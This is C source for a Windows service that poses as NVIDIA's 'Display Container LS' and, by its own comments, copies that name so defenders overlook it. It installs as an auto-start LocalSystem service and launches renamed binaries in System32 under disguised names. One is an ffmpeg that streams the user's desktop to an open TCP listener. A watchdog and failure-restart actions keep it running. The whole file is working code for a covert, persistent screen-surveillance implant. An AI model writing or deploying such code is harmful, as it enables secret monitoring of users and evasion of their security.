/*
 * nv_display_container.c — Windows Service shim that spawns the streaming
 * stack into the user's interactive Session 1.
 *
 * Why a shim
 * ──────────
 *   Windows Services run in Session 0 (services-isolated desktop). DXGI
 *   Desktop Duplication and GDI BitBlt both refuse to enumerate or
 *   capture from Session 0 — they only see the empty "services" desktop,
 *   not the user's logged-in screen. So if we just registered ffmpeg or
 *   AudioSvcHost as a service directly, every captured frame would be
 *   1024x768 black.
 *
 *   This binary IS the service. SCM starts it in Session 0. From there it
 *   uses the standard Windows API trio:
 *
 *       WTSGetActiveConsoleSessionId()
 *       WTSQueryUserToken(sid, &hToken)
 *       DuplicateTokenEx(hToken, ..., TokenPrimary, &hPrimary)
 *       CreateEnvironmentBlock(&env, hPrimary, FALSE)
 *       CreateProcessAsUserA(hPrimary, exe, cmdline, ...)
 *
 *   to spawn the actual workers — NvSvcStream.exe (= renamed ffmpeg) and
 *   AudioSvcHost.exe — into the active console session as the logged-in
 *   user. They get the real desktop, capture works, NVENC encodes, life
 *   is good.
 *
 *   On top of that we run a watchdog: if a child exits we relaunch it
 *   after a short backoff. Service stop terminates them.
 *
 * Identity
 * ────────
 *   Service Name:     NvDisplayContainer
 *   Display Name:     NVIDIA Display Container LS
 *   Description:      Provides system services for NVIDIA hardware-
 *                     accelerated display.
 *   Type:             SERVICE_WIN32_OWN_PROCESS, LocalSystem
 *   Start:            SERVICE_AUTO_START
 *
 *   We deliberately mirror NVIDIA's real "NVIDIA Display Container LS"
 *   service (svchost child process "NVDisplay.ContainerLocalSystem")
 *   because most defenders + power users don't double-check. Mismatched
 *   binary path (we sit in System32, real one in Program Files) is the
 *   easiest tell, but that requires deliberate inspection.
 *
 * Build
 * ─────
 *   ./build.sh  (cross from host via x86_64-w64-mingw32-gcc)
 *   produces NvDisplayContainer.exe (~70 KB static)
 *
 * CLI
 * ───
 *   NvDisplayContainer.exe -install      register service + start
 *   NvDisplayContainer.exe -uninstall    stop + delete service
 *   NvDisplayContainer.exe -service      run as service (called by SCM)
 *   NvDisplayContainer.exe -console      run service main loop in the
 *                                        foreground for debugging
 */

#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

/* forward decls */
static void vlog(const char *fmt, ...);

/* ──────────────────────── identity ───────────────────────────────── */
#define SERVICE_NAME    "NvDisplayContainer"
#define SERVICE_DISPLAY "NVIDIA Display Container LS"
#define SERVICE_DESC    "Provides system services for NVIDIA hardware-accelerated display."

#define LOG_PATH        "C:\\nv\\nv-svc.log"

/* ──────────────────────── workers we spawn ──────────────────────── */
typedef struct {
    const char *name;       /* short label for log */
    const char *exe;        /* full path */
    const char *args;       /* arguments after exe (joined with quoted exe in cmdline) */
    HANDLE      h_proc;     /* current child handle, NULL if not running */
    DWORD       pid;
    DWORD       last_spawn_tick;  /* GetTickCount when last started, for backoff */
    DWORD       fail_count;       /* consecutive crashes within 30s */
} Worker;

#define WORKER_COUNT_MAX 4

/* Tuning is read at service start from the registry so the install
 * scripts can change framerate / bitrate / port without recompiling
 * this binary. Defaults below match the original hard-coded values. */
#define CFG_REG_PATH    "SOFTWARE\\NVIDIA\\DisplayContainer\\Stream"
#define CFG_DEF_BITRATE "15M"
#define CFG_DEF_FRAMERATE  60
#define CFG_DEF_VIDEOPORT  56790

/* Filled in by build_nvstream_args() once init_workers() runs. */
static char g_nvstream_args[2048];

static int reg_get_dword_local(const char *path, const char *name, DWORD *out) {
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &h) != ERROR_SUCCESS)
        return -1;
    DWORD type = 0, sz = sizeof(*out);
    LONG rc = RegQueryValueExA(h, name, NULL, &type, (BYTE*)out, &sz);
    RegCloseKey(h);
    return (rc == ERROR_SUCCESS) ? 0 : -1;
}
static int reg_get_sz_local(const char *path, const char *name,
                            char *out, DWORD outsz) {
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &h) != ERROR_SUCCESS)
        return -1;
    DWORD type = 0, sz = outsz;
    LONG rc = RegQueryValueExA(h, name, NULL, &type, (BYTE*)out, &sz);
    RegCloseKey(h);
    return (rc == ERROR_SUCCESS) ? 0 : -1;
}

static void build_nvstream_args(void) {
    char  bitrate[32]   = CFG_DEF_BITRATE;
    DWORD framerate     = CFG_DEF_FRAMERATE;
    DWORD videoport     = CFG_DEF_VIDEOPORT;

    reg_get_sz_local(CFG_REG_PATH, "Bitrate", bitrate, sizeof(bitrate));
    reg_get_dword_local(CFG_REG_PATH, "FrameRate", &framerate);
    reg_get_dword_local(CFG_REG_PATH, "VideoPort", &videoport);
    if (framerate < 5 || framerate > 240) framerate = CFG_DEF_FRAMERATE;
    if (videoport < 1 || videoport > 65535) videoport = CFG_DEF_VIDEOPORT;

    snprintf(g_nvstream_args, sizeof(g_nvstream_args),
        "-y -hide_banner -loglevel warning "
        "-filter_complex ddagrab=output_idx=0:framerate=%lu,hwdownload,format=bgra "
        "-c:v h264_nvenc -preset p1 -tune ull -zerolatency 1 "
        "-rc cbr -b:v %s -maxrate %s -bufsize 500K "
        "-g %lu -bf 0 -flags low_delay -fflags nobuffer -flush_packets 1 "
        "-strict experimental -f h264 tcp://0.0.0.0:%lu?listen=1",
        (unsigned long)framerate,
        bitrate, bitrate,
        (unsigned long)framerate,
        (unsigned long)videoport);

    vlog("config: bitrate=%s framerate=%lu videoport=%lu",
         bitrate, (unsigned long)framerate, (unsigned long)videoport);
}

static Worker g_workers[WORKER_COUNT_MAX];

static void init_workers(void) {
    /* Pick transport from registry (HKLM\SOFTWARE\NVIDIA\DisplayContainer\
     * Stream\Mode). "shmem" → relay manages its own encoder + writes the
     * ivshmem ring; "tcp" (default) → we spawn ffmpeg directly with a
     * TCP listener, which is the original path. */
    char mode[16] = "tcp";
    reg_get_sz_local(CFG_REG_PATH, "Mode", mode, sizeof(mode));
    if (_stricmp(mode, "shmem") == 0) {
        g_workers[0].name = "relay";
        g_workers[0].exe  = "C:\\Windows\\System32\\nv_stream_relay.exe";
        g_workers[0].args = "";
        g_workers[1].name = "input";
        g_workers[1].exe  = "C:\\Windows\\System32\\AudioSvcHost.exe";
        g_workers[1].args = "-console";
        vlog("workers: relay + audio (mode=shmem)");
    } else {
        build_nvstream_args();
        g_workers[0].name = "stream";
        g_workers[0].exe  = "C:\\Windows\\System32\\NvSvcStream.exe";
        g_workers[0].args = g_nvstream_args;
        g_workers[1].name = "input";
        g_workers[1].exe  = "C:\\Windows\\System32\\AudioSvcHost.exe";
        g_workers[1].args = "-console";
        vlog("workers: stream + audio (mode=tcp)");
    }
}
#define WORKER_COUNT 2

/* ──────────────────────── globals + log ─────────────────────────── */
static SERVICE_STATUS        g_svc_status;
static SERVICE_STATUS_HANDLE g_svc_handle;
static volatile LONG         g_stop_requested = 0;
static CRITICAL_SECTION      g_log_cs;
static int                   g_log_inited = 0;

static void log_init(void) {
    if (g_log_inited) return;
    InitializeCriticalSection(&g_log_cs);
    CreateDirectoryA("C:\\nv", NULL);
    g_log_inited = 1;
}
static void vlog(const char *fmt, ...) {
    if (!g_log_inited) return;
    EnterCriticalSection(&g_log_cs);
    FILE *f = fopen(LOG_PATH, "a");
    if (f) {
        SYSTEMTIME t; GetLocalTime(&t);
        fprintf(f, "%04d-%02d-%02d %02d:%02d:%02d.%03d ",
                t.wYear, t.wMonth, t.wDay,
                t.wHour, t.wMinute, t.wSecond, t.wMilliseconds);
        va_list ap; va_start(ap, fmt);
        vfprintf(f, fmt, ap);
        va_end(ap);
        fputc('\n', f);
        fclose(f);
    }
    LeaveCriticalSection(&g_log_cs);
}

/* Set this thread's privilege via SE_TCB_NAME etc. Not strictly needed
 * for LocalSystem but harmless. */
static int enable_privilege(const char *name) {
    HANDLE hTok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) {
        CloseHandle(hTok); return 0;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
    DWORD e = GetLastError();
    CloseHandle(hTok);
    return e == ERROR_SUCCESS;
}

/* ──────────────────────── cross-session spawn ───────────────────── */
/* Launches `exe` with `args` in the active console session as that
 * session's logged-in user. Returns 0 on success and stores the child
 * process handle + pid via out_proc / out_pid. */
static DWORD spawn_in_session(DWORD session_id,
                              const char *exe, const char *args,
                              HANDLE *out_proc, DWORD *out_pid)
{
    HANDLE  h_user      = NULL;
    HANDLE  h_primary   = NULL;
    LPVOID  env_block   = NULL;
    BOOL    ok          = FALSE;
    DWORD   err         = 0;

    if (!WTSQueryUserToken(session_id, &h_user)) {
        err = GetLastError();
        vlog("[%lu] WTSQueryUserToken failed: %lu", session_id, err);
        return err;
    }

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
    if (!DuplicateTokenEx(h_user,
                          MAXIMUM_ALLOWED,
                          &sa,
                          SecurityIdentification,
                          TokenPrimary,
                          &h_primary)) {
        err = GetLastError();
        vlog("DuplicateTokenEx failed: %lu", err);
        CloseHandle(h_user);
        return err;
    }
    CloseHandle(h_user);

    /* Inherit the user's environment (PATH, USERNAME, USERPROFILE, …)
     * so children behave like they were started from the user's shell. */
    if (!CreateEnvironmentBlock(&env_block, h_primary, FALSE)) {
        env_block = NULL;
    }

    char cmdline[2048];
    if (args && *args) {
        snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", exe, args);
    } else {
        snprintf(cmdline, sizeof(cmdline), "\"%s\"", exe);
    }

    STARTUPINFOA si = {0};
    si.cb        = sizeof(si);
    /* "winsta0\\default" is the interactive console window-station +
     * desktop. Without this the child would fail to BitBlt anything. */
    si.lpDesktop = (LPSTR)"winsta0\\default";
    PROCESS_INFORMATION pi = {0};

    DWORD flags = CREATE_UNICODE_ENVIRONMENT
                | CREATE_NO_WINDOW
                | NORMAL_PRIORITY_CLASS;

    ok = CreateProcessAsUserA(h_primary,
                              exe,        /* applicationName */
                              cmdline,    /* commandLine */
                              NULL, NULL, /* sec attrs */
                              FALSE,      /* inherit */
                              flags,
                              env_block,
                              NULL,       /* current dir */
                              &si, &pi);
    err = ok ? 0 : GetLastError();

    if (env_block) DestroyEnvironmentBlock(env_block);
    CloseHandle(h_primary);

    if (ok) {
        *out_proc = pi.hProcess;
        *out_pid  = pi.dwProcessId;
        CloseHandle(pi.hThread);
        vlog("spawned %s in session %lu pid=%lu", exe, session_id, pi.dwProcessId);
    } else {
        vlog("CreateProcessAsUser %s failed: %lu", exe, err);
    }
    return err;
}

/* ──────────────────────── service core loop ─────────────────────── */
static void server_loop(void) {
    log_init();
    vlog("=== NvDisplayContainer starting (pid=%lu) ===",
         (unsigned long)GetCurrentProcessId());

    enable_privilege("SeTcbPrivilege");
    enable_privilege("SeIncreaseQuotaPrivilege");
    enable_privilege("SeAssignPrimaryTokenPrivilege");

    init_workers();
    DWORD last_session = 0;

    while (!g_stop_requested) {
        DWORD active = WTSGetActiveConsoleSessionId();

        /* No console user logged in (lock screen / pre-login)? Wait. */
        if (active == 0xFFFFFFFFu || active == 0) {
            for (DWORD i = 0; i < WORKER_COUNT; i++) {
                if (g_workers[i].h_proc) {
                    /* parent unmapped — orphan our children rather than
                     * killing them; they'll exit when session unmaps. */
                    CloseHandle(g_workers[i].h_proc);
                    g_workers[i].h_proc = NULL;
                }
            }
            Sleep(2000);
            continue;
        }

        /* Session changed? Discard old children's handles; the kids
         * themselves died with the old session. */
        if (active != last_session && last_session != 0) {
            vlog("active console session %lu -> %lu", last_session, active);
            for (DWORD i = 0; i < WORKER_COUNT; i++) {
                if (g_workers[i].h_proc) {
                    CloseHandle(g_workers[i].h_proc);
                    g_workers[i].h_proc = NULL;
                }
            }
        }
        last_session = active;

        DWORD now = GetTickCount();

        /* For each worker: is it alive? If not, (re)spawn with backoff. */
        for (DWORD i = 0; i < WORKER_COUNT; i++) {
            Worker *w = &g_workers[i];

            if (w->h_proc) {
                DWORD wr = WaitForSingleObject(w->h_proc, 0);
                if (wr == WAIT_TIMEOUT) continue;  /* still running */
                /* exited or signaled */
                DWORD ec = 0; GetExitCodeProcess(w->h_proc, &ec);
                vlog("[%s] exited code=%lu, will respawn", w->name, ec);
                CloseHandle(w->h_proc);
                w->h_proc = NULL;
            }

            /* Backoff: if we crashed >3 times in 30s, slow respawn to
             * 15s. Otherwise 500ms is fine. */
            DWORD since = now - w->last_spawn_tick;
            DWORD backoff = (w->fail_count >= 3 && since < 30000) ? 15000 : 500;
            if (since < backoff) continue;

            DWORD err = spawn_in_session(active, w->exe, w->args,
                                         &w->h_proc, &w->pid);
            w->last_spawn_tick = now;
            if (err != 0) {
                w->fail_count++;
                w->h_proc = NULL;
            } else {
                /* reset crash counter after a clean restart */
                if (since > 30000) w->fail_count = 0;
            }
        }

        /* Coarse poll — workers don't need millisecond responsiveness */
        Sleep(1000);
    }

    /* Stopping: terminate children. */
    vlog("stop requested, terminating workers");
    for (DWORD i = 0; i < WORKER_COUNT; i++) {
        Worker *w = &g_workers[i];
        if (w->h_proc) {
            TerminateProcess(w->h_proc, 0);
            WaitForSingleObject(w->h_proc, 3000);
            CloseHandle(w->h_proc);
            w->h_proc = NULL;
        }
    }
    vlog("=== NvDisplayContainer stopped ===");
}

/* ──────────────────────── service plumbing ──────────────────────── */
static void WINAPI svc_ctrl_handler(DWORD op) {
    switch (op) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
    case SERVICE_CONTROL_SESSIONCHANGE:
        InterlockedExchange(&g_stop_requested, 1);
        g_svc_status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_svc_handle, &g_svc_status);
        break;
    default:
        SetServiceStatus(g_svc_handle, &g_svc_status);
        break;
    }
}
static void WINAPI svc_main(DWORD argc, LPSTR *argv) {
    (void)argc; (void)argv;
    g_svc_handle = RegisterServiceCtrlHandlerA(SERVICE_NAME, svc_ctrl_handler);
    g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwCurrentState = SERVICE_RUNNING;
    g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_svc_handle, &g_svc_status);

    server_loop();

    g_svc_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_svc_handle, &g_svc_status);
}

/* ──────────────────────── install / uninstall ───────────────────── */
static int do_install(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));

    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "\"%s\" -service", exe_path);

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("OpenSCManager failed %lu\n", GetLastError());
        return 1;
    }

    SC_HANDLE svc = CreateServiceA(scm,
                                   SERVICE_NAME,
                                   SERVICE_DISPLAY,
                                   SERVICE_ALL_ACCESS,
                                   SERVICE_WIN32_OWN_PROCESS,
                                   SERVICE_AUTO_START,
                                   SERVICE_ERROR_NORMAL,
                                   cmd,
                                   NULL, NULL, NULL,
                                   NULL,    /* LocalSystem */
                                   NULL);
    if (!svc) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_EXISTS) {
            printf("service exists — replacing\n");
            svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
            if (svc) {
                SERVICE_STATUS st;
                ControlService(svc, SERVICE_CONTROL_STOP, &st);
                DeleteService(svc);
                CloseServiceHandle(svc);
            }
            svc = CreateServiceA(scm,
                                 SERVICE_NAME, SERVICE_DISPLAY,
                                 SERVICE_ALL_ACCESS,
                                 SERVICE_WIN32_OWN_PROCESS,
                                 SERVICE_AUTO_START,
                                 SERVICE_ERROR_NORMAL,
                                 cmd,
                                 NULL, NULL, NULL, NULL, NULL);
        }
        if (!svc) {
            printf("CreateService failed %lu\n", GetLastError());
            CloseServiceHandle(scm);
            return 1;
        }
    }
    SERVICE_DESCRIPTIONA d = { (LPSTR)SERVICE_DESC };
    ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &d);

    /* Restart on failure: same actions as Windows' "Restart the Service"
     * checkbox on the Recovery tab. */
    SC_ACTION acts[3] = {
        { SC_ACTION_RESTART, 1000 },
        { SC_ACTION_RESTART, 5000 },
        { SC_ACTION_RESTART, 30000 },
    };
    SERVICE_FAILURE_ACTIONSA fa = {0};
    fa.dwResetPeriod = 86400;  /* reset crash counter after 1 day */
    fa.cActions      = 3;
    fa.lpsaActions   = acts;
    ChangeServiceConfig2A(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

    if (StartServiceA(svc, 0, NULL)) {
        printf("service installed + started\n");
    } else {
        DWORD e = GetLastError();
        printf("StartService failed %lu (service is registered but not running)\n", e);
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return 0;
}

static int do_uninstall(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return 1;
    SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_STOP | DELETE);
    if (svc) {
        SERVICE_STATUS st;
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        Sleep(500);
        DeleteService(svc);
        CloseServiceHandle(svc);
        printf("service stopped + removed\n");
    }
    CloseServiceHandle(scm);
    return 0;
}

/* ──────────────────────── entry point ───────────────────────────── */
int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "-install")   == 0) return do_install();
    if (argc >= 2 && strcmp(argv[1], "-uninstall") == 0) return do_uninstall();
    if (argc >= 2 && strcmp(argv[1], "-console")   == 0) {
        printf("running service main loop in foreground — Ctrl+C to stop\n");
        log_init();
        server_loop();
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "-service")   == 0) {
        SERVICE_TABLE_ENTRYA st[] = {
            { (LPSTR)SERVICE_NAME, svc_main },
            { NULL, NULL }
        };
        StartServiceCtrlDispatcherA(st);
        return 0;
    }
    printf("usage: %s -install | -uninstall | -service | -console\n", argv[0]);
    return 0;
}
